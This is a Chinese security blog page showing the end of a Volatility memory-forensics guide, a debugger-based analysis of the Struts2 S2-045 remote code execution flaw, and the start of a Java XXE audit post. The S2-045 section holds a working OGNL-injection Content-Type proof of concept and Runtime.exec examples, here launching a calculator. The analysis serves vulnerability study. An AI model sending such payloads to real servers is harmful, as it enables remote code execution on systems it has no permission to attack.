+<p>4）userassist信息查看<br>userassist键值包含系统或桌面执行文件的信息，如名称、路径、执行次数、最后一次执行时间等。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180407-042003.raw --profile=Win7SP1x86 userassist</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132636-cbeb204e-9226-1.png" alt=""></p>
+<p><strong>0x11查看服务svcscan</strong><br>svcscan查看服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 svcscan</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132636-cbfc9cf2-9226-1.png" alt=""></p>
+<p><strong>0x12查看内核驱动模块</strong><br>modules  查看内核驱动<br>modscan、driverscan  可查看一些隐藏的内核驱动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 modules</span><br><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 modscan</span><br><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 driverscan</span><br></pre></td></tr></table></figure></p>
+<p><strong>0x13查看文件</strong><br>filescan  可查看 一些rootkit隐藏文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 filescan  #可查看 一些rootkit隐藏文件</span><br></pre></td></tr></table></figure></p>
+<p><strong>0x14查看时间线cmdliner</strong><br>timeliner 查看各组件时间线。 输出会很多，建议输出到指定文件中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180407-042003.raw --profile=Win7SP1x86 timeliner --output=text --output-file=out1.txt</span><br></pre></td></tr></table></figure></p>
+<p>当然，volatility还有许多命令和插件，本文只是抛砖引玉，简单写了一些常用方式。</p>
+<p><strong>参考</strong><br><a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference" target="_blank" rel="noopener">https://github.com/volatilityfoundation/volatility/wiki/Command-Reference</a><br><a href="http://cyberforensicator.com/2018/03/11/finding-metasploits-meterpreter-traces-with-memory-forensics/" target="_blank" rel="noopener">http://cyberforensicator.com/2018/03/11/finding-metasploits-meterpreter-traces-with-memory-forensics/</a><br><a href="https://eforensicsmag.com/finding-advanced-malware-using-volatility/" target="_blank" rel="noopener">https://eforensicsmag.com/finding-advanced-malware-using-volatility/</a><br><a href="https://volatility-labs.blogspot.com/2012/09/howto-scan-for-internet-cachehistory.html" target="_blank" rel="noopener">https://volatility-labs.blogspot.com/2012/09/howto-scan-for-internet-cachehistory.html</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/17/【Struts2-命令-代码执行漏洞分析系列】S2-045/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pplsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/ppl.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pplsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/17/【Struts2-命令-代码执行漏洞分析系列】S2-045/" itemprop="url">【Struts2-命令-代码执行漏洞分析系列】S2-045</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-17T08:32:33+08:00">
+                2019-01-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞分析/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞分析</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>2018-09-08 首发于阿里先知: <a href="https://xz.aliyun.com/t/2712" target="_blank" rel="noopener">https://xz.aliyun.com/t/2712</a></p>
+<h3 id="0x00-OGNL表达式"><a href="#0x00-OGNL表达式" class="headerlink" title="0x00 OGNL表达式"></a>0x00 OGNL表达式</h3><h4 id="1-ognl基本介绍"><a href="#1-ognl基本介绍" class="headerlink" title="1) ognl基本介绍"></a>1) ognl基本介绍</h4><p>OGNL是Object-Graph Navigation Language（对象图导航语言）的缩写，它是一种功能强大的表达式语言(比EL更强大)，通过简单一致的表达式语法，可以存取对象的任何属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。<br>xwork提供了OGNL表达式。其jar包为ognl-x.x.x.jar。<br>Struts2框架使用OGNL作为默认的表达式语言。<br>OGNL有三大要素，分别是表达式、根对象、Context对象。<br>表达式是整个OGNL的核心，OGNL根据表达式去对象中取值。所有OGNL操作都是针对表达式解析后进行的。<br>根对象（Root）:Root对象可以理解为OGNL的操作对象，表达式规定了”做什么”，而Root对象则规定了”对谁操作”。OGNL称为对象图导航语言，所谓对象图，即以任意一个对象为根，通过OGNL可以访问与这个对象关联的其它对象。<br>Context对象:OGNL的取值还需要一个上下文环境。Root对象所在环境就是OGNL的上下文环境(Context)。上下文环境规定了OGNL的操作在哪里进行。上下文环境Context是一个Map类型的对象，在表达式中访问Context中的对象，需要使用”#”号加上对象名称，即#”对象名称”的形式，表示了与访问Root对象的区别。</p>
+<h4 id="2-ognl基本用法示例"><a href="#2-ognl基本用法示例" class="headerlink" title="2)ognl基本用法示例"></a>2)ognl基本用法示例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">package lltest;</span><br><span class="line"></span><br><span class="line">import ognl.Ognl;</span><br><span class="line">import ognl.OgnlContext;</span><br><span class="line">import ognl.OgnlException;</span><br><span class="line"></span><br><span class="line">public class ognltest1 &#123;</span><br><span class="line">	 public static void main(String[] args) throws OgnlException &#123;</span><br><span class="line">     //创建一个Ognl上下文对象</span><br><span class="line">     OgnlContext context = new OgnlContext();</span><br><span class="line"></span><br><span class="line">	 // 调用对象的方法 </span><br><span class="line">    Object obj1 = Ognl.getValue(&quot;&apos;helloworld123&apos;.length()&quot;, context, context.getRoot());</span><br><span class="line">    System.out.println(obj1);</span><br><span class="line"></span><br><span class="line">    // 获取OGNL上下文的对象</span><br><span class="line">    context.put(&quot;name&quot;, &quot;lltest&quot;);</span><br><span class="line">    Object obj2 = Ognl.getValue(&quot;#name&quot;, context, context.getRoot());</span><br><span class="line">    System.out.println(obj2);</span><br><span class="line"></span><br><span class="line">    //调用类静态方法</span><br><span class="line">    //@[类全名(包括包路径)]@[方法名|值名]</span><br><span class="line">    Object obj3 = Ognl.getValue(&quot;@java.lang.String@format(&apos;hello %s&apos;, &apos;lltest&apos;)&quot;, context);</span><br><span class="line">    System.out.println(obj3);</span><br><span class="line">	 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>说明：需要导入ognl-3.0.6.jar<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122928-c662d6fc-b31f-1.png" alt=""></p>
+<h4 id="3-ognl执行系统命令"><a href="#3-ognl执行系统命令" class="headerlink" title="3) ognl执行系统命令"></a>3) ognl执行系统命令</h4><p>用法： @[类全名(包括包路径)]@[方法名|值名]   即@包名.类名@方法名   如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object obj = Ognl.getValue(&quot;@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;)&quot;, context);</span><br></pre></td></tr></table></figure></p>
+<p>完整示例:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package lltest;</span><br><span class="line"></span><br><span class="line">import ognl.Ognl;</span><br><span class="line">import ognl.OgnlContext;</span><br><span class="line">import ognl.OgnlException;</span><br><span class="line"></span><br><span class="line">public class OsExec &#123;</span><br><span class="line">	 public static void main(String[] args) throws OgnlException &#123;</span><br><span class="line">		 OgnlContext context = new OgnlContext();</span><br><span class="line">		//@[类全名(包括包路径)@[方法名|值名]]</span><br><span class="line">		 //执行命令</span><br><span class="line">		 Object obj = Ognl.getValue(&quot;@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;)&quot;, context);</span><br><span class="line">		 System.out.println(obj);</span><br><span class="line">	 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>说明：需要导入javassist-3.11.0.GA.jar和ognl-3.0.6.jar 两个jar包</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122929-c67cc9cc-b31f-1.png" alt=""></p>
+<h3 id="0x01-S2-045漏洞简述"><a href="#0x01-S2-045漏洞简述" class="headerlink" title="0x01 S2-045漏洞简述"></a>0x01 S2-045漏洞简述</h3><p>Struts2默认处理multipart上传报文的解析器为Jakarta插件（org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest类）。<br>但是Jakarta插件在处理文件上传(multipart)的请求时会捉捕异常信息，并对异常信息进行OGNL表达式处理。当content-type错误时会抛出异常并带上Content-Type属性值，可通过构造附带OGNL表达的请求导致远程代码执行。<br>影响Struts2版本： Struts 2.3.5 – Struts 2.3.31, Struts 2.5 – Struts 2.5.10<br>官方通告详情：<br><a href="https://cwiki.apache.org/confluence/display/WW/S2-045" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-045</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122929-c68caba8-b31f-1.png" alt=""></p>
+<h3 id="0x02-S2-045漏洞分析"><a href="#0x02-S2-045漏洞分析" class="headerlink" title="0x02 S2-045漏洞分析"></a>0x02 S2-045漏洞分析</h3><p>为复现漏洞，可使用struts2.3.x环境下自带的struts2-showcase演示demo示例环境，进行漏洞复现。下载struts-2.3.20-apps.zip  (<a href="http://archive.apache.org/dist/struts/2.3.20/" target="_blank" rel="noopener">http://archive.apache.org/dist/struts/2.3.20/</a> )<br>或者自行编写简单测试样例，不去详述了。<br>下面使用eclipse对struts-2.3.20进行动态分析：</p>
+<h4 id="1-漏洞补丁对比"><a href="#1-漏洞补丁对比" class="headerlink" title="1) 漏洞补丁对比"></a>1) 漏洞补丁对比</h4><p><a href="https://github.com/apache/struts/commit/352306493971e7d5a756d61780d57a76eb1f519a?diff=split" target="_blank" rel="noopener">https://github.com/apache/struts/commit/352306493971e7d5a756d61780d57a76eb1f519a?diff=split</a><br>主要对core/src/main/java/org/apache/struts2/dispatcher/multipart/JakartaMultiPartRequest.java中的<br>return LocalizedTextUtil.findText(this.getClass(), errorKey, defaultLocale, e.getMessage(), args);  进行删除，并重新定义<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122929-c6a78ad6-b31f-1.png" alt=""></p>
+<h4 id="2-Jakarta解析multipart上传请求"><a href="#2-Jakarta解析multipart上传请求" class="headerlink" title="2)Jakarta解析multipart上传请求"></a>2)Jakarta解析multipart上传请求</h4><p>Struts2默认处理multipart上传报文的解析器是plugin插件（org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest类）<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122929-c6ba53b4-b31f-1.png" alt=""></p>
+<p>StrutsPrepareAndExecuteFilter类是Struts2默认配置的入口过滤器。Struts2首先对输入请求对象request的进行封装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request = prepare.wrapRequest(request);</span><br></pre></td></tr></table></figure></p>
+<p>路径struts-2.3.20\src\core\src\main\java\org\apache\struts2\dispatcher\ng\filter\StrutsPrepareAndExecuteFilter.java<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122929-c6d47352-b31f-1.png" alt=""><br>跟进wrapRequest()<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122929-c6e3210e-b31f-1.png" alt=""><br>继续跟进wrapRequest()<br>路径struts-2.3.20\src\core\src\main\java\org\apache\struts2\dispatcher\Dispatcher.java<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122929-c6f536be-b31f-1.png" alt=""></p>
+<p>此处有两个关注点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1）if (content_type != null &amp;&amp; content_type.contains(&quot;multipart/form-data&quot;)) &#123;</span><br></pre></td></tr></table></figure></p>
+<p>S2-045的POC一般都有(#nike=’multipart/form-data’)这样一句，就是使content_type.contains(“multipart/form-data”)判断为true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2）MultiPartRequest mpr = getMultiPartRequest();</span><br></pre></td></tr></table></figure></p>
+<p>继续追踪getMultiPartRequest方法。通过配置struts.multipart.parser属性，可以指定不同的解析类，而默认就是org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest类。</p>
+<h4 id="3-加断点动态测试"><a href="#3-加断点动态测试" class="headerlink" title="3) 加断点动态测试"></a>3) 加断点动态测试</h4><p>弹出计算器POC：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: haha~multipart/form-data %&#123;#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;)&#125;;</span><br></pre></td></tr></table></figure></p>
+<h5 id="JakartaMultiPartRequest-java-buildErrorMessage"><a href="#JakartaMultiPartRequest-java-buildErrorMessage" class="headerlink" title="JakartaMultiPartRequest.java - buildErrorMessage()"></a>JakartaMultiPartRequest.java - buildErrorMessage()</h5><p>路径struts-2.3.20\src\core\src\main\java\org\apache\struts2\dispatcher\multipart<br>在return LocalizedTextUtil.findText()处加断点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">protected String buildErrorMessage(Throwable e, Object[] args) &#123;</span><br><span class="line">      String errorKey = &quot;struts.messages.upload.error.&quot; + e.getClass().getSimpleName();</span><br><span class="line">      if (LOG.isDebugEnabled()) &#123;</span><br><span class="line">          LOG.debug(&quot;Preparing error message for key: [#0]&quot;, errorKey);</span><br><span class="line">      &#125;</span><br><span class="line">      return LocalizedTextUtil.findText(this.getClass(), errorKey, defaultLocale, e.getMessage(), args); //加断点</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122929-c7053b04-b31f-1.png" alt=""><br>到达断点return LocalizedTextUtil.findText()，执行下一步，即可弹出计算器：<br>此时e的值为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.fileupload.FileUploadBase$InvalidContentTypeException: the request doesn&apos;t contain a multipart/form-data or multipart/mixed stream, content type header is haha~multipart/form-data %&#123;#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;)&#125;;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122930-c71ee0d6-b31f-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122930-c73e41e2-b31f-1.png" alt=""></p>
+<p>下面到达断点return LocalizedTextUtil.findText() 然后跟进findText()方法继续调试</p>
+<h5 id="LocalizedTextUtil-java"><a href="#LocalizedTextUtil-java" class="headerlink" title="LocalizedTextUtil.java"></a>LocalizedTextUtil.java</h5><p>路径struts-2.3.20\src\xwork-core\src\main\java\com\opensymphony\xwork2\util\ LocalizedTextUtil.java</p>
+<h6 id="findText"><a href="#findText" class="headerlink" title="findText()"></a>findText()</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return LocalizedTextUtil.findText(this.getClass(), errorKey, defaultLocale, e.getMessage(), args);</span><br></pre></td></tr></table></figure>
+<p>跟进LocalizedTextUtil.findText()<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122930-c74ea9c4-b31f-1.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return findText(aClass, aTextName, locale, defaultMessage, args, valueStack);</span><br></pre></td></tr></table></figure></p>
+<p>继续跟进return findText()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">此时indexedTextName为：null</span><br><span class="line">defaultMessage为：</span><br><span class="line">the request doesn&apos;t contain a multipart/form-data or multipart/mixed stream, content type header is haha~multipart/form-data %&#123;#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;)&#125;;</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122930-c76c9560-b31f-1.png" alt=""></p>
+<h6 id="getDefaultMessage"><a href="#getDefaultMessage" class="headerlink" title="getDefaultMessage()"></a>getDefaultMessage()</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = getDefaultMessage(aTextName, locale, valueStack, args, defaultMessage);</span><br></pre></td></tr></table></figure>
+<p>继续跟进getDefaultMessage()<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122930-c77f3e04-b31f-1.png" alt=""></p>
+<h5 id="TextParseUtil-java-translateVariables"><a href="#TextParseUtil-java-translateVariables" class="headerlink" title="TextParseUtil.java - translateVariables()"></a>TextParseUtil.java - translateVariables()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MessageFormat mf = buildMessageFormat(TextParseUtil.translateVariables(message, valueStack), locale);</span><br></pre></td></tr></table></figure>
+<p> 继续跟进 translateVariables()<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122930-c78d3798-b31f-1.png" alt=""></p>
+<p>translateVariables()方法使用了 ognl 的 $ 与 % 标签，两者都能告诉执行环境 ${} 或 %{} 中的内容为ognl表达式。所以POC中使用 % 或者$ 都可以触发漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return parser.evaluate(openChars, expression, ognlEval, maxLoopCount);</span><br></pre></td></tr></table></figure>
+<p>继续跟进return translateVariables()<br>最后调用了evaluate()方法解析OGNL，执行代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此时expression值为the request doesn&apos;t contain a multipart/form-data or multipart/mixed stream, content type header is haha~multipart/form-data %&#123;#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;)&#125;;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122930-c79df998-b31f-1.png" alt=""></p>
+<h5 id="evaluate-方法说明"><a href="#evaluate-方法说明" class="headerlink" title="evaluate()方法说明"></a>evaluate()方法说明</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParsedValueEvaluator ognlEval = new ParsedValueEvaluator() &#123;</span><br></pre></td></tr></table></figure>
+<p>跟进ParsedValueEvaluator()<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122930-c7aa855a-b31f-1.png" alt=""><br>translateVariables()方法继承接口com.opensymphony.xwork2.util.TextParseUtil.ParsedValueEvaluator<br>在创建对象后重写了evaluate()方法<br>通过该方法的说明文档可知evaluate()方法会解析ognl表达式<br><a href="https://struts.apache.org/maven/struts2-core/apidocs/com/opensymphony/xwork2/util/TextParseUtil.ParsedValueEvaluator.html" target="_blank" rel="noopener">https://struts.apache.org/maven/struts2-core/apidocs/com/opensymphony/xwork2/util/TextParseUtil.ParsedValueEvaluator.html</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122931-c7bf49f4-b31f-1.png" alt=""></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h3><p><a href="https://paper.seebug.org/241/" target="_blank" rel="noopener">https://paper.seebug.org/241/</a><br><a href="https://paper.seebug.org/247/" target="_blank" rel="noopener">https://paper.seebug.org/247/</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/17/powershell反弹shell常见方式/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pplsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/ppl.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pplsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/17/powershell反弹shell常见方式/" itemprop="url">powershell反弹shell常见方式</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-17T08:32:33+08:00">
+                2019-01-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>2018-03-06 首发于360安全客: <a href="https://www.anquanke.com/post/id/99793" target="_blank" rel="noopener">https://www.anquanke.com/post/id/99793</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/17/JAVA代码审计之XXE与SSRF/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pplsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/ppl.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pplsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/17/JAVA代码审计之XXE与SSRF/" itemprop="url">JAVA代码审计之XXE与SSRF</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-17T08:32:33+08:00">
+                2019-01-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>2018-09-19 首发于阿里先知: <a href="https://xz.aliyun.com/t/2761" target="_blank" rel="noopener">https://xz.aliyun.com/t/2761</a></p>
+<h3 id="一、XXE"><a href="#一、XXE" class="headerlink" title="一、XXE"></a>一、XXE</h3><h4 id="0x01-XXE漏洞简介"><a href="#0x01-XXE漏洞简介" class="headerlink" title="0x01 XXE漏洞简介"></a>0x01 XXE漏洞简介</h4><p>XXE（XML外部实体注入，XML External Entity) ，在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。Java中的XXE支持sun.net.<a href="http://www.protocol" target="_blank" rel="noopener">www.protocol</a> 里的所有协议：http，https，file，ftp，mailto，jar，netdoc。一般利用file协议读取文件，利用http协议探测内网，没有回显时可组合利用file协议和ftp协议来读取文件。</p>
+<h4 id="0x02-XXE相关基础概念"><a href="#0x02-XXE相关基础概念" class="headerlink" title="0x02 XXE相关基础概念"></a>0x02 XXE相关基础概念</h4><h5 id="XML-amp-DTD"><a href="#XML-amp-DTD" class="headerlink" title="XML&amp;DTD"></a>XML&amp;DTD</h5><p>XML （可扩展标记语言，EXtensible Markup Language），是一种标记语言，用来传输和存储数据，而非显示数据。<br>DTD（文档类型定义，Document Type Definition）的作用是定义 XML 文档的合法构建模块。它使用一系列的合法元素来定义文档结构。</p>
+<h5 id="实体ENTITY"><a href="#实体ENTITY" class="headerlink" title="实体ENTITY"></a>实体ENTITY</h5><p>XML中的实体类型，一般有下面几种：字符实体、命名实体（或内部实体）、外部普通实体、外部参数实体。除外部参数实体外，其它实体都以字符（&amp;）开始，以字符（;）结束。</p>
+<h6 id="1-字符实体"><a href="#1-字符实体" class="headerlink" title="1)字符实体"></a>1)字符实体</h6><p>字符实体类似html中的实体编码，形如：&#97;（十进制）或者&#x61;（十六进制）。</p>
